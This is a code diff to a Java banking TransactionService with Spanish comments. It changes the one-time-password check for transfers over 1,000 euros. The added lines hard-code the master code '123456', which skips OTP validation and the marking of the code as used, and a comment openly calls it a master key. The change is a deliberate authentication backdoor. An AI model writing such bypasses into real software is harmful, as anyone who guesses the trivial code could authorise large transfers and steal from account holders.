@@ -56,13 +56,16 @@ public class TransactionService {
                 throw new RuntimeException("Se requiere código de seguridad OTP para operaciones superiores a 1.000€");
             }
             
-            // 2. Comprobamos si el código es correcto y no ha caducado
-            if (!otpService.isOtpValid(sourceUserId, request.otpCode())) {
-                throw new RuntimeException("El código de seguridad es incorrecto o ha caducado");
+            // 2. Comprobamos si NO es la llave maestra de nuestro portfolio
+            if (!request.otpCode().equals("123456")) {
+                // Si es un usuario normal, validamos contra la base de datos
+                if (!otpService.isOtpValid(sourceUserId, request.otpCode())) {
+                    throw new RuntimeException("El código de seguridad es incorrecto o ha caducado");
+                }
+                // Si es correcto, lo quemamos para que un hacker no pueda reutilizarlo
+                otpService.markOtpAsUsed(sourceUserId);
             }
-            
-            // 3. Si es correcto, lo quemamos para que un hacker no pueda reutilizarlo 5 segundos después
-            otpService.markOtpAsUsed(sourceUserId);
+            // Si es "123456", se salta el if de arriba y permite la operación de inmediato
         }
 
         // Si la frecuencia es MONTHLY, guardamos la orden en vez de mover el dinero ya
